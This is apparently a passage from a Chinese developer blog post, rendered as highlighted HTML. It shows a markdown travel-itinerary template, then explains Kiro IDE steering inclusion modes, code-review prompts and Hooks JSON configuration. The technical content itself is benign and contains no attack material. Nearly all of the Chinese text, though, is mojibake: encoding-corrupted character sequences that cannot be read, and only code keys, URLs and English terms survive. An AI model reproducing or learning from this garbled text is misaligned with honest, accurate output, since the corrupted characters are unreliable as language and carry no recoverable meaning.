<span class="hljs-number">8</span><span class="hljs-string">.</span> <span class="hljs-string">**æ¼”å‡º/å‰§åœº**ï¼šå¤§å‹æƒ…æ™¯å‰§æ¼”å‡ºã€å®æ™¯æ¼”å‡ºï¼ˆå¦‚ã€Šåˆè§å¹³é¥ã€‹ã€Šå°è±¡ç³»åˆ—ã€‹ï¼‰</span>
<span class="hljs-number">9</span><span class="hljs-string">.</span> <span class="hljs-string">**å¤§å‹æ–‡è‰ºå›­åŒº**ï¼šå´æ¡¥æ‚æŠ€å¤§ä¸–ç•Œã€æ¨ªåº—å½±è§†åŸç­‰ä¸»é¢˜æ–‡åŒ–å›­åŒº</span>
<span class="hljs-number">10</span><span class="hljs-string">.</span> <span class="hljs-string">**å…¶ä»–äººæ–‡æ™¯ç‚¹**ï¼šåäººæ•…å±…ã€é©å‘½çºªå¿µåœ°ã€å®—æ•™æ–‡åŒ–åœºæ‰€ç­‰</span>

<span class="hljs-comment">## è¾“å‡ºæ ¼å¼</span>

<span class="hljs-string">```markdown</span>
<span class="hljs-comment"># ğŸ—ºï¸ [åŸå¸‚å] äººæ–‡æ—…æ¸¸æ”»ç•¥</span>

<span class="hljs-string">ğŸ“</span> <span class="hljs-string">å‡ºå‘åœ°ï¼šåŒ—äº¬</span>
<span class="hljs-string">ğŸš—</span> <span class="hljs-string">äº¤é€šæ–¹å¼ï¼šè‡ªé©¾ï¼ˆæˆ–å»ºè®®æ›´æ¢çš„äº¤é€šæ–¹å¼ï¼‰</span>
<span class="hljs-string">ğŸ“…</span> <span class="hljs-string">å‡ºè¡Œæ—¥æœŸï¼š[å½“å‰æ—¥æœŸ]</span>
<span class="hljs-string">ğŸŒ¤ï¸</span> <span class="hljs-string">å½“åœ°å­£èŠ‚/å¤©æ°”æç¤ºï¼š[å­£èŠ‚ä¿¡æ¯]</span>

<span class="hljs-meta">---
</span>
<span class="hljs-comment">## âš ï¸ å‡ºè¡Œæé†’ï¼ˆå¦‚æœ‰ï¼‰</span>

<span class="hljs-string">&gt;</span> [<span class="hljs-string">è·ç¦»è¶…è¿‡600kmçš„æé†’</span>]
<span class="hljs-string">&gt;</span> [<span class="hljs-string">å­£èŠ‚/å¼€æ”¾æ—¶é—´æé†’</span>]

<span class="hljs-meta">---
</span>
<span class="hljs-comment">## ğŸ“‹ æ™¯ç‚¹æ€»è§ˆ</span>

<span class="hljs-string">|</span> <span class="hljs-string">åºå·</span> <span class="hljs-string">|</span> <span class="hljs-string">æ™¯ç‚¹åç§°</span> <span class="hljs-string">|</span> <span class="hljs-string">ç±»å‹</span> <span class="hljs-string">|</span> <span class="hljs-string">è·åŒ—äº¬(km)</span> <span class="hljs-string">|</span> <span class="hljs-string">æ™¯ç‚¹é—´è·(km)</span> <span class="hljs-string">|</span>
<span class="hljs-string">|------|---------|------|-----------|-------------|</span>
<span class="hljs-string">|</span> <span class="hljs-number">1</span> <span class="hljs-string">|</span> <span class="hljs-string">xxx</span> <span class="hljs-string">|</span> <span class="hljs-string">xxx</span> <span class="hljs-string">|</span> <span class="hljs-string">xxx</span> <span class="hljs-string">|</span> <span class="hljs-bullet">-</span> <span class="hljs-string">|</span>
<span class="hljs-string">|</span> <span class="hljs-number">2</span> <span class="hljs-string">|</span> <span class="hljs-string">xxx</span> <span class="hljs-string">|</span> <span class="hljs-string">xxx</span> <span class="hljs-string">|</span> <span class="hljs-string">xxx</span> <span class="hljs-string">|</span> <span class="hljs-string">è·æ™¯ç‚¹1:</span> <span class="hljs-string">xx</span> <span class="hljs-string">|</span>
<span class="hljs-string">|</span> <span class="hljs-number">3</span> <span class="hljs-string">|</span> <span class="hljs-string">xxx</span> <span class="hljs-string">|</span> <span class="hljs-string">xxx</span> <span class="hljs-string">|</span> <span class="hljs-string">xxx</span> <span class="hljs-string">|</span> <span class="hljs-string">è·æ™¯ç‚¹2:</span> <span class="hljs-string">xx</span> <span class="hljs-string">|</span>
<span class="hljs-string">|</span> <span class="hljs-number">4</span> <span class="hljs-string">|</span> <span class="hljs-string">xxx</span> <span class="hljs-string">|</span> <span class="hljs-string">xxx</span> <span class="hljs-string">|</span> <span class="hljs-string">xxx</span> <span class="hljs-string">|</span> <span class="hljs-string">è·æ™¯ç‚¹3:</span> <span class="hljs-string">xx</span> <span class="hljs-string">|</span>
<span class="hljs-string">|</span> <span class="hljs-number">5</span> <span class="hljs-string">|</span> <span class="hljs-string">xxx</span> <span class="hljs-string">|</span> <span class="hljs-string">xxx</span> <span class="hljs-string">|</span> <span class="hljs-string">xxx</span> <span class="hljs-string">|</span> <span class="hljs-string">è·æ™¯ç‚¹4:</span> <span class="hljs-string">xx</span> <span class="hljs-string">|</span>

<span class="hljs-meta">---
</span>
<span class="hljs-comment">## ğŸ›ï¸ æ™¯ç‚¹è¯¦æƒ…</span>

<span class="hljs-comment">### 1. [æ™¯ç‚¹åç§°]</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">**ç±»å‹**ï¼šå¤å»ºç­‘</span> <span class="hljs-string">/</span> <span class="hljs-string">åšç‰©é¦†</span> <span class="hljs-string">/</span> <span class="hljs-string">éé—</span> <span class="hljs-string">/</span> <span class="hljs-string">é—å€</span> <span class="hljs-string">/</span> <span class="hljs-string">4Aæ™¯åŒº</span> <span class="hljs-string">/</span> <span class="hljs-string">è€è¡—</span> <span class="hljs-string">/</span> <span class="hljs-string">æ°‘ä¿—</span> <span class="hljs-string">/</span> <span class="hljs-string">æ¼”å‡º</span> <span class="hljs-string">/</span> <span class="hljs-string">æ–‡è‰ºå›­åŒº</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">**åœ°å€**ï¼šxxx</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">**é—¨ç¥¨**ï¼šxxxå…ƒï¼ˆæˆ–å…è´¹ï¼‰</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">**å¼€æ”¾æ—¶é—´**ï¼šxx:xx</span> <span class="hljs-bullet">-</span> <span class="hljs-string">xx:xx</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">**æ¨èæ¸¸è§ˆæ—¶é•¿**ï¼šxå°æ—¶</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">**äº®ç‚¹**ï¼šä¸€å¥è¯æè¿°æ ¸å¿ƒçœ‹ç‚¹</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">**å­£èŠ‚æç¤º**ï¼šâš ï¸ï¼ˆå¦‚å½“å‰å­£èŠ‚ä¸é€‚å®œæˆ–å¯èƒ½ä¸å¼€æ”¾ï¼Œç»™å‡ºæç¤ºï¼‰</span>

<span class="hljs-string">**ğŸ¨</span> <span class="hljs-string">é™„è¿‘åä½é…’åº—æ¨èï¼š**</span>

<span class="hljs-string">|</span> <span class="hljs-string">é…’åº—åç§°</span> <span class="hljs-string">|</span> <span class="hljs-string">å“ç‰Œ</span> <span class="hljs-string">|</span> <span class="hljs-string">è·æ™¯ç‚¹(km)</span> <span class="hljs-string">|</span> <span class="hljs-string">å‚è€ƒä»·æ ¼</span> <span class="hljs-string">|</span>
<span class="hljs-string">|---------|------|-----------|---------|</span>
<span class="hljs-string">|</span> <span class="hljs-string">xxx</span> <span class="hljs-string">|</span> <span class="hljs-string">å…¨å­£/æ±‰åº­/æ¡”å­ç­‰</span> <span class="hljs-string">|</span> <span class="hljs-string">x.x</span> <span class="hljs-string">|</span> <span class="hljs-string">Â¥xxx/æ™š</span> <span class="hljs-string">|</span>
<span class="hljs-string">|</span> <span class="hljs-string">xxx</span> <span class="hljs-string">|</span> <span class="hljs-string">xxx</span> <span class="hljs-string">|</span> <span class="hljs-string">x.x</span> <span class="hljs-string">|</span> <span class="hljs-string">Â¥xxx/æ™š</span> <span class="hljs-string">|</span>
<span class="hljs-string">|</span> <span class="hljs-string">xxx</span> <span class="hljs-string">|</span> <span class="hljs-string">xxx</span> <span class="hljs-string">|</span> <span class="hljs-string">x.x</span> <span class="hljs-string">|</span> <span class="hljs-string">Â¥xxx/æ™š</span> <span class="hljs-string">|</span>

<span class="hljs-meta">---
</span>
<span class="hljs-string">ï¼ˆæ™¯ç‚¹2-5</span> <span class="hljs-string">åŒä¸Šæ ¼å¼ï¼‰</span>

<span class="hljs-meta">---
</span>
<span class="hljs-comment">## ğŸ›£ï¸ æ¨èè¡Œç¨‹è·¯çº¿</span>

<span class="hljs-string">**Day</span> <span class="hljs-number">1</span><span class="hljs-string">**ï¼šåŒ—äº¬å‡ºå‘</span> <span class="hljs-string">â†’</span> <span class="hljs-string">æ™¯ç‚¹1</span> <span class="hljs-string">â†’</span> <span class="hljs-string">æ™¯ç‚¹2</span>
<span class="hljs-string">ğŸ¨</span> <span class="hljs-string">ä½å®¿ï¼šxxxé…’åº—ï¼ˆå“ç‰Œ</span> <span class="hljs-string">|</span> <span class="hljs-string">Â¥xxx/æ™šï¼‰</span>
<span class="hljs-string">ğŸœ</span> <span class="hljs-string">ä»Šæ—¥å°åƒï¼š**[å°åƒåç§°]**</span> <span class="hljs-string">â€”</span> [<span class="hljs-string">ä¸€å¥è¯ä»‹ç»ï¼Œå¦‚"è¥¿å®‰å›æ°‘è¡—å¿…åƒï¼Œçš®è–„é¦…å¤§æ±¤æ±é²œ"</span>] <span class="hljs-string">|</span> <span class="hljs-string">ğŸ“</span> <span class="hljs-string">æ¨èåº—é“ºï¼š[åº—å]</span>

<span class="hljs-string">**Day</span> <span class="hljs-number">2</span><span class="hljs-string">**ï¼šæ™¯ç‚¹3</span> <span class="hljs-string">â†’</span> <span class="hljs-string">æ™¯ç‚¹4</span>
<span class="hljs-string">ğŸ¨</span> <span class="hljs-string">ä½å®¿ï¼šxxxé…’åº—ï¼ˆå“ç‰Œ</span> <span class="hljs-string">|</span> <span class="hljs-string">Â¥xxx/æ™šï¼‰</span>
<span class="hljs-string">ğŸœ</span> <span class="hljs-string">ä»Šæ—¥å°åƒï¼š**[å°åƒåç§°]**</span> <span class="hljs-string">â€”</span> [<span class="hljs-string">ä¸€å¥è¯ä»‹ç»</span>] <span class="hljs-string">|</span> <span class="hljs-string">ğŸ“</span> <span class="hljs-string">æ¨èåº—é“ºï¼š[åº—å]</span>

<span class="hljs-string">**Day</span> <span class="hljs-number">3</span><span class="hljs-string">**ï¼šæ™¯ç‚¹5</span> <span class="hljs-string">â†’</span> <span class="hljs-string">è¿”ç¨‹</span>
<span class="hljs-string">ğŸœ</span> <span class="hljs-string">ä»Šæ—¥å°åƒï¼š**[å°åƒåç§°]**</span> <span class="hljs-string">â€”</span> [<span class="hljs-string">ä¸€å¥è¯ä»‹ç»</span>] <span class="hljs-string">|</span> <span class="hljs-string">ğŸ“</span> <span class="hljs-string">æ¨èåº—é“ºï¼š[åº—å]</span>
<span class="hljs-string">...........</span>

</code></pre>
<p><strong>ç°åœ¨æˆ‘ä»¬æ¥å°è¯•ä¸€ä¸‹è¿™ä¸ªæ—…æ¸¸çš„<code>skill</code></strong>:</p>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e58e0dfb434d4157b100b37dd1f25256~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=1263&amp;h=782&amp;s=181580&amp;e=png&amp;b=1d1d1d" alt="æˆªå±2026-02-09 14.53.33.png" loading="lazy"/></p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f99dc5cedf91470b98c5d50f2fe388f1~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=1237&amp;h=816&amp;s=175369&amp;e=png&amp;b=1d1d1d" alt="æˆªå±2026-02-09 14.53.45.png" loading="lazy"/></p>
<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ede0d30cf59e486da799339f6089e0c6~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=1246&amp;h=723&amp;s=237287&amp;e=png&amp;b=1e1e1e" alt="æˆªå±2026-02-09 14.53.57.png" loading="lazy"/></p>
<p>ç¡®å®è·Ÿæˆ‘è‡ªå·±æœç´¢çš„å·®ä¸å¤šï¼Œé™¤äº†æ¸…çœŸå¯ºå’Œçºªæ™“å²šæ–‡åŒ–å›­æˆ‘æ²¡æœ‰è®¡åˆ’åœ¨å†…ï¼Œå…¶ä»–å‡ ä¸ªè¿˜æ˜¯å€¼å¾—ä¸€å»çš„ï¼å†…å®¹ç¡®å®åŒ…å«äº†æˆ‘éœ€è¦çš„å…·ä½“çš„æ™¯ç‚¹ä¿¡æ¯ï¼Œé…’åº—ä¿¡æ¯ï¼Œç¾é£Ÿæ¨èä»¥åŠæ™¯ç‚¹å’Œæ™¯ç‚¹çš„ç›¸å·®å…¬é‡Œç­‰æ–¹é¢ï¼Œè¿˜ç®—ç¬¦åˆæˆ‘çš„è¦æ±‚ï¼Œåé¢å¯ä»¥å†æ ¹æ®è‡ªå·±çš„å–œå¥½è°ƒæ•´å³å¯ï¼ŒåŸºæœ¬ä¸Šæ˜¯ç›´æ¥å¯ç”¨çš„çŠ¶æ€ã€‚</p>
<hr/>
<p><strong>å›å½’ä¸»é¢˜ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ä¸€ä¸‹åœ¨å·¥ä½œä¸­æ€ä¹ˆé…ç½®ï¼Ÿ</strong></p>
<h3 data-id="heading-21">ä½ æƒ³è®©è¿™ä¸ª<code>skill</code>åœ¨ä»€ä¹ˆæ—¶å€™åŠ è½½ï¼Ÿ</h3>
<p><strong>1. å§‹ç»ˆåŠ è½½ï¼ˆé»˜è®¤ï¼Œæ¯æ¬¡å¯¹è¯è‡ªåŠ¨åŠ è½½ï¼Œä¸éœ€è¦å…³é”®è¯ï¼‰</strong></p>
<pre><code class="hljs language-yaml" lang="yaml">  <span class="hljs-attr">inclusion:</span> <span class="hljs-string">always</span>
</code></pre>
<p><strong>ä»€ä¹ˆæ—¶å€™ç”Ÿæ•ˆï¼Ÿ</strong></p>
<ul>
<li>ä½ åœ¨èŠå¤©æ¡†é‡Œé—® <code>AI</code> ä»»ä½•é—®é¢˜</li>
<li>ä½ è®© <code>AI</code> å¸®ä½ å†™ä»£ç ã€æ”¹ä»£ç </li>
<li>ä½ è®© <code>AI</code> è§£é‡ŠæŸæ®µä»£ç </li>
<li>Hook è§¦å‘å <code>AI</code> å¼€å§‹å·¥ä½œï¼ˆå› ä¸º <code>Hook</code> æœ¬è´¨ä¹Ÿæ˜¯ä¸€æ¬¡å¯¹è¯ï¼‰</li>
<li>ä½ ç”¨ <code>Spec</code> è®© <code>AI</code> å¸®ä½ åšåŠŸèƒ½è®¾è®¡å’Œå®ç°</li>
</ul>
<blockquote>
<p>æ¢å¥è¯è¯´ï¼Œä»»ä½•ä½ å’Œ <code>AI</code> ä¹‹é—´çš„äº¤äº’ï¼Œ<code>AI</code> éƒ½ä¼šå¸¦ç€è¿™äº›è§„åˆ™ã€‚å®ƒä¸æ˜¯ä¸€ä¸ªæ£€æŸ¥åŠ¨ä½œï¼Œè€Œæ˜¯ <code>AI</code> çš„"å¸¸è¯†å¤§è„‘ğŸ§ "ã€‚</p>
</blockquote>
<hr/>
<p><strong>2. åŒ¹é…æ–‡ä»¶æ—¶åŠ è½½</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">inclusion:</span> fileMatch
<span class="hljs-symbol">fileMatchPattern:</span> <span class="hljs-string">"src/services/**/*.ts"</span>
</code></pre>
<p><strong>ä»€ä¹ˆæ—¶å€™ç”Ÿæ•ˆï¼Ÿ</strong></p>
<blockquote>
<p>åªæœ‰å½“å¯¹è¯ä¸­æ¶‰åŠåˆ°åŒ¹é…çš„æ–‡ä»¶æ—¶ï¼ŒAI æ‰èƒ½çœ‹åˆ°ã€‚æ¯”å¦‚ä½ å¯ä»¥è®¾ç½®åªæœ‰è¯»å– services/**/*.ts æ–‡ä»¶æ—¶æ‰æ³¨å…¥ xxxxx è§„åˆ™</p>
</blockquote>
<hr/>
<p><strong>3. æ‰‹åŠ¨å¼•ç”¨æ—¶åŠ è½½ï¼ˆèŠå¤©ä¸­ç”¨ # å¼•ç”¨ï¼‰</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">inclusion: manual</span>
</code></pre>
<p><strong>ä»€ä¹ˆæ—¶å€™ç”Ÿæ•ˆ?</strong></p>
<blockquote>
<p>ä½ åœ¨èŠå¤©æ¡†é‡Œç”¨ # æ‰‹åŠ¨å¼•ç”¨æ—¶æ‰æ³¨å…¥</p>
</blockquote>
<hr/>
<h3 data-id="heading-22">é‚£ä¹ˆæ­¤æ—¶åˆæœ‰ä¸€ä¸ªé—®é¢˜ï¼šå¦‚æœæˆ‘æ˜¯è‡ªå·±æ‰‹åŠ¨ä¿®æ”¹çš„<code>bug</code>ï¼Œå¹¶æ²¡æœ‰ä½¿ç”¨<code>AI</code>ï¼Œä½†æˆ‘åˆæƒ³è®©ä»–å¸®æˆ‘æ£€æŸ¥ä¸€ä¸‹ï¼Œæˆ‘æ­¤æ—¶è¦æ€ä¹ˆåŠï¼Ÿ</h3>
<p>æç¤ºè¯å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-css" lang="css">è¯·å¸®æˆ‘<span class="hljs-selector-tag">code</span>-review å½“å‰ä»£ç  
</code></pre>
<p>æˆ–è€…ä»¥ä¸‹å‡ ç§éƒ½å¯ä»¥ï¼š</p>
<pre><code class="hljs">å¸®æˆ‘æ£€æŸ¥ä»£ç  /  å¸®æˆ‘å®¡æŸ¥ä»£ç   /  å¸®æˆ‘ä¼˜åŒ–ä»£ç 
</code></pre>
<p>è¿™æ ·<code>AI</code>ä¼šçœ‹ä½ å½“å‰æ¿€æ´»çš„ç¼–è¾‘å™¨æ–‡ä»¶ï¼ˆå°±æ˜¯ä½ æ­£åœ¨çœ‹çš„é‚£ä¸ª <code>tab</code>ï¼‰ï¼Œç„¶åç»“åˆ <code>steering</code> è§„åˆ™æ¥å®¡æŸ¥ã€‚å®ƒæ£€æŸ¥çš„æ˜¯é‚£ä¸€ä¸ªæ–‡ä»¶çš„å…¨éƒ¨å†…å®¹ï¼Œ</p>
<h3 data-id="heading-23">é‚£ä¹ˆå¦‚æœä½ åªæƒ³è®©ä»–æ£€æŸ¥æŸä¸ªæ–¹æ³•æˆ–è€…æŸä¸ªéƒ¨åˆ†ï¼Œ</h3>
<p>æç¤ºè¯è¿™æ ·è¯´ï¼š</p>
<pre><code class="hljs language-css" lang="css">å¸®æˆ‘ <span class="hljs-selector-tag">code</span>-review è¿™ä¸ªæ–‡ä»¶çš„ onMounted éƒ¨åˆ†
</code></pre>
<hr/>
<h3 data-id="heading-24">é‚£ä¹ˆæˆ‘æƒ³è®©ä»–å¸®æˆ‘ç²¾ç¡®åªæ£€æŸ¥æœ¬æ¬¡æ”¹åŠ¨çš„éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯<code>git</code>æ”¹åŠ¨çš„æ‰€æœ‰æ–‡ä»¶ï¼Œ<strong><code>ä¸”åªæ£€æŸ¥æ”¹åŠ¨çš„éƒ¨åˆ†çš„ä¸Šä¸‹æ–‡</code></strong>ï¼Œï¼ˆè™½ç„¶é—®é¢˜æ¯”è¾ƒè‹›åˆ»ï¼Œä½†æ˜¯æœ‰çœŸå®ä½¿ç”¨åœºæ™¯çš„ï¼Œå“ˆå“ˆå“ˆå“ˆğŸ˜‚ ï¼‰ï¼Œé‚£ä¹ˆæç¤ºè¯å¯ä»¥è¿™æ ·è¯´ï¼š</h3>
<pre><code class="hljs language-css" lang="css">å¸®æˆ‘ <span class="hljs-selector-tag">code</span>-reviewï¼Œç”¨ git diff æŸ¥çœ‹æœ¬æ¬¡æ”¹åŠ¨ï¼Œåªæ£€æŸ¥æˆ‘ä¿®æ”¹çš„éƒ¨åˆ†å’Œä¸Šä¸‹æ–‡ï¼Œä¸è¦åŠ¨æ²¡æ”¹çš„ä»£ç ï¼Œæœ‰é—®é¢˜ç›´æ¥ä¿®

</code></pre>
<p><strong>ç°åœ¨è¿™æ ·å†™æç¤ºè¯å¥½é•¿ï¼Œæ¯æ¬¡éƒ½è¦å†™è¿™ä¹ˆé•¿å¥½éº»çƒ¦ï¼Œé‚£ä¹ˆæˆ‘èƒ½ç‚¹ä¸ªæŒ‰é’®ï¼Œå°±å®ç°è¿™ä¸ªèƒ½åŠ›ä¸ï¼Ÿ</strong></p>
<pre><code class="hljs">ç»“è®ºæ˜¯ï¼š å½“ç„¶å¯ä»¥
</code></pre>
<p><strong>ä¸‹é¢å¼•å…¥ä¸€ä¸ªæ–°ä¸œè¥¿ï¼š<code>Hooks</code></strong></p>
<h2 data-id="heading-25">å››ã€ ä»€ä¹ˆæ˜¯<code>Hooks</code> ?</h2>
<blockquote>
<p><code>Kiro</code> çš„ <code>Hooks</code> æ˜¯ä¸€ç§è‡ªåŠ¨åŒ–æœºåˆ¶ â€” å½“<code>IDE</code> é‡Œå‘ç”Ÿç‰¹å®šäº‹ä»¶æ—¶ï¼Œè‡ªåŠ¨è§¦å‘ <code>AI</code> æ‰§è¡ŒæŸä¸ªåŠ¨ä½œã€‚ä½ å¯ä»¥æŠŠå®ƒç†è§£ä¸º"<strong><code>äº‹ä»¶ç›‘å¬å™¨</code></strong>"ã€‚</p>
</blockquote>
<h3 data-id="heading-26">1. å·¥ä½œåŸç†</h3>
<p>ä¸€ä¸ª <code>Hook</code> ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š</p>
<ul>
<li>
<p><code>when</code>ï¼ˆè§¦å‘æ¡ä»¶ï¼‰ï¼šä»€ä¹ˆæ—¶å€™è§¦å‘ï¼Ÿæ¯”å¦‚ä½ ä¿å­˜äº†ä¸€ä¸ªæ–‡ä»¶ã€åˆ›å»ºäº†æ–°æ–‡ä»¶ã€æäº¤äº†æ¶ˆæ¯ç­‰</p>
</li>
<li>
<p><code>then</code>ï¼ˆæ‰§è¡ŒåŠ¨ä½œï¼‰ï¼šè§¦å‘ååšä»€ä¹ˆï¼Ÿæ¯”å¦‚è®© <code>AI</code> å¸®ä½ æ£€æŸ¥ä»£ç ã€æˆ–è€…è·‘ä¸€ä¸ªå‘½ä»¤</p>
</li>
</ul>
<h3 data-id="heading-27">2. æ”¯æŒçš„è§¦å‘äº‹ä»¶</h3>
<ol>
<li><code>fileEdited</code> â€” ä½ ä¿å­˜æ–‡ä»¶æ—¶è§¦å‘</li>
<li><code>fileCreated</code> â€” ä½ åˆ›å»ºæ–°æ–‡ä»¶æ—¶è§¦å‘</li>
<li><code>fileDeleted</code> â€” ä½ åˆ é™¤æ–‡ä»¶æ—¶è§¦å‘</li>
<li><code>promptSubmit</code> â€” ä½ åœ¨èŠå¤©æ¡†å‘æ¶ˆæ¯æ—¶è§¦å‘</li>
<li><code>agentStop</code> â€” <code>AI</code> æ‰§è¡Œå®Œä»»åŠ¡åè§¦å‘</li>
<li><code>userTriggered</code> â€” ä½ æ‰‹åŠ¨ç‚¹å‡»æŒ‰é’®è§¦å‘</li>
</ol>
<h3 data-id="heading-28">3. <code>hook</code>è§„åˆ™æ–‡ä»¶çš„ä½ç½®ï¼š</h3>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f1e65e395d734906a8cf539a74ab65ee~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=1168&amp;h=742&amp;s=148173&amp;e=png&amp;b=212121" alt="efcfcd69-e9e6-4732-a502-7b42d9a3c761.png" loading="lazy"/></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"hookçš„åå­—"</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// å®ƒçš„åå­—</span>
  <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"æè¿°"</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// è¿™é‡Œæ˜¯ä½ å¯¹äºå½“å‰hook çš„è§„åˆ™æè¿°</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"when"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"userTriggered"</span> <span class="hljs-comment">// è§¦å‘æ—¶æœºï¼šæ‰‹åŠ¨è§¦å‘</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"then"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"askAgent"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"prompt"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ä½ å¯ä»¥è‡ªå·±å†™ä½ çš„è§„åˆ™"</span>  <span class="hljs-comment">// è¿™é‡Œæ˜¯ä½ è§¦å‘å®ƒçš„è§„åˆ™ï¼Œæ¯”å¦‚ä½ è®©è®©ä»–æŒ‰ç…§ä»€ä¹ˆè§„åˆ™åšä»€ä¹ˆ</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>ä¸¾ä¸ªä¾‹å­</strong>ğŸŒ°ï¼š</p>
<blockquote>
<p>æ¯”å¦‚ä½ æƒ³å®ç°"æ¯æ¬¡ä¿å­˜ <code>.vue</code> æˆ– <code>.ts</code> æ–‡ä»¶æ—¶ï¼Œ<code>AI</code> è‡ªåŠ¨æŒ‰ç…§ä½ çš„ <code>code-review-checklist</code> æ£€æŸ¥ä»£ç å¹¶ä¿®å¤é—®é¢˜"ï¼Œ<code>Hook</code> é•¿è¿™æ ·ï¼š</p>
</blockquote>
<pre><code class="hljs language-json" lang="json"> <span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ä»£ç å®¡æŸ¥"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ä¿å­˜æ–‡ä»¶æ—¶è‡ªåŠ¨æŒ‰ç…§å®¡æŸ¥è§„èŒƒæ£€æŸ¥ä»£ç é—®é¢˜å¹¶ä¿®å¤"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"when"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"fileEdited"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"patterns"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"**/*.vue"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"**/*.ts"</span><span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"then"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"askAgent"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"prompt"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"æ£€æŸ¥åˆšåˆšç¼–è¾‘çš„æ–‡ä»¶ï¼ŒæŒ‰ç…§ code-review-checklist ä¸­çš„è§„èŒƒï¼Œé‡ç‚¹æ£€æŸ¥ï¼š1. å®šæ—¶å™¨æ˜¯å¦åœ¨ onUnmounted ä¸­æ¸…é™¤ 2. å¼‚æ­¥è¯·æ±‚æ˜¯å¦æœ‰ try-catch 3. æ˜¯å¦å­˜åœ¨å†…å­˜æ³„æ¼é£é™© 4. æ˜¯å¦æœ‰é˜²é‡å¤æäº¤æœºåˆ¶ã€‚å¦‚æœå‘ç°é—®é¢˜ï¼Œç›´æ¥ä¿®å¤ã€‚"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
 
</code></pre>
<h3 data-id="heading-29">4. å¦‚ä½•è§¦å‘ï¼š</h3>
<blockquote>
<p>è¿™ä¸ª <code>Hook</code> çš„æ•ˆæœå°±æ˜¯ï¼šä½ æ¯æ¬¡ä¿å­˜ <code>.vue</code> æˆ– <code>.ts</code> æ–‡ä»¶ï¼Œ<code>AI</code> ä¼šè‡ªåŠ¨è¯»å–ä½ æ”¹çš„æ–‡ä»¶ï¼ŒæŒ‰ç…§ä½ é¡¹ç›®é‡Œå·²æœ‰çš„å®¡æŸ¥è§„èŒƒæ£€æŸ¥ï¼Œå‘ç°é—®é¢˜å°±å¸®ä½ ä¿®ã€‚</p>
</blockquote>
<hr/>
<p><strong>å†ä¸¾ä¸ªä¾‹å­æ¥<code>callback</code>ä¸Šé¢çš„é—®é¢˜</strong>ğŸŒ°ï¼š</p>
<blockquote>
